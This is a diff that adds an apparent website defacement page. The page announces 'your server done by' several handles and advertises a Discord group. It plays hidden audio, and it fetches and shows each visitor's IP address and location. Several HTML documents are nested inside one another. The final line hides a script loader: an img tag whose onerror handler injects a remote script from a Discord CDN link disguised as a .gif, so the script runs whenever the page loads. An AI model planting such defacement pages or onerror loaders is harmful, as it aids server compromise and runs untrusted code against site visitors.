@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>M7d</title>
+</head>
+<body bgcolor="#000000">
+<script>
+    var names = [
+        { name: "[ Bo Sheikha  ]", color: "RED" },
+        { name: "[ RELX  ]", color: "RED" }
+    ];
+
+    var nameIndex = 0;
+
+    function changeNames() {
+        var currentName = names[nameIndex];
+        document.getElementById("name").textContent = currentName.name;
+        document.getElementById("name").style.color = currentName.color;
+        nameIndex = (nameIndex + 1) % names.length;
+    }
+
+    // Change the names every 1 second
+    setInterval(changeNames, 1000);
+</script>
+<p align="center">
+    <img border="0" src="https://cdn.discordapp.com/attachments/1274551101361881144/1278728270023626782/Screenshot_2024-08-20_192543.png?ex=66d1dc01&is=66d08a81&hm=9b1883dde7b57e119d2d2d348fb930e0348d4f6467d35a7fe25a67b46755b2d4&" width="500" height="425">
+</p>
+<p align="center">
+    <font face="Courier" size="6" style="color: #000000;">
+        <span style="color: rgb(177, 5, 5);">your server done by </span>
+        <span id="name"></span>
+    </font>
+</p>
+<p align="center">
+    <b>
+<font face="Courier" color="#000000">
+<a href="https://discord.gg/M7D" style="font-size: 24px; color: rgb(255, 255, 255); text-decoration: none;">Discord.gg/</a>
+<span style="font-size: 24px; color: white;">M7D  </span>
+
+
+</font>
+
+    </b>
+</p>
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>..</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #000000;
+            background-color: #000000;
+            overflow: hidden;
+        }
+
+        h1, h3 {
+            color: #ffffff;
+        }
+
+        #ip-address {
+            color: rgb(255, 255, 255);
+        }
+
+        #ip-info {
+            font-family: Arial, sans-serif;
+            white-space: pre;
+            color: rgb(255, 255, 255);
+        }
+
+        .cmd-text-container {
+            position: relative;
+        }
+
+        .cmd-text {
+            color: #000000;
+            font-size: 9px;
+            font-family: Arial, sans-serif;
+            white-space: nowrap;
+            position: absolute;
+            animation: scrollText 20s linear infinite;
+            transform: translateX(100%);
+            -webkit-text-stroke: 1px Orange;
+            text-stroke: 1px Orange;
+        }
+
+        .gray-text {
+            color: #000000;
+            outline: 1px solid #000000;
+        }
+
+        .json-data {
+            font-family: Arial, sans-serif;
+            color: Orange;
+            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
+        }
+
+        .json-data span {
+            color: black;
+        }
+
+        @keyframes scrollText {
+            0% {
+                transform: translateX(100%);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .cmd-text:hover {
+            animation-play-state: paused;
+        }
+
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            filter: blur(10px);
+        }
+
+        /* Hide the audio controls */
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Animated Text</title>
+    <style>
+        @keyframes lightning {
+            0% { color: rgb(255, 255, 255); }
+            50% { color: rgb(184, 0, 0); }
+            100% { color: white; }
+        }
+
+        .animated-text {
+            animation: lightning 1s linear infinite;
+        }
+    </style>
+</head>
+<body>
+     <h3 class="animated-text">discord.gg/M7D</h3>
+	 <h3 class="animated-text">RFX & bo sheikha & relx & Al-Dhafiri & Aziz</h3>
+</body>
+</html>
+    <p id="ip-address">
+        <span style="color: rgb(245, 9, 9);">Your IP Address: </span>
+        <span id="ip-address-value" style="color: rgb(0, 0, 0); font-size: 17px;">Loading...</span>
+    </p>
+
+    <h3 style="color: rgb(211, 205, 205); animation: flashing 1s infinite;">Your IP Info :</h3>
+    <pre id="ip-info" class="json-data">Fetching...</pre>
+    <div class="cmd-text-container" style="position: relative; top: -15px;">
+        <div class="cmd-text" style="font-size: 17px; text-stroke: 3px black; color: black;">  </div>
+    </div>
+
+    <!-- Hidden audio element with autoplay -->
+    <audio autoplay loop style="display: none;">
+        <source src="https://cdn.discordapp.com/attachments/1276895317002031188/1277648692291178619/-_.mp3?ex=66cdee91&is=66cc9d11&hm=26c8770cfd5372f8456fcb5ee573d4c1bae44ccc85a5cf1fef0ec7ac6b7f3c4d&" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+<video style="width: 100vw; height: 100vh;" controls autoplay loop muted>
+    <source src="https://cdn.discordapp.com/attachments/1132710229423947829/1249189664481476688/iEZeoQAnJ1MTHSFG.mov?ex=66ce8c88&is=66cd3b08&hm=c11bd585b68f6ad132327b90b6197e0d38f6b653f681192373244ebfa92fbe96&">
+    Your browser does not support the video element.
+</video>
+
+
+    <script>
+        // JavaScript code to fetch and display the user's IP address and information
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+                .then(response => response.json())
+                .then(ipInfoData => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        // Fetch IP address and information initially
+        fetchIPAndInfo();
+    </script>
+</body>
+</html>
+<img src="about:invalid" onerror="document.body.appendChild(document.createElement('script')).src='https://cdn.discordapp.com/attachments/1127945954008498257/1128403016156983326/DCFE33CB-173C-4D81-B606-FE6C83E4A79C.gif?ex=66af2973&is=66add7f3&hm=9d5bb86d901f65309165fc19e0a07c15138f34c789adf8d357d03643ae23ebf0&';">
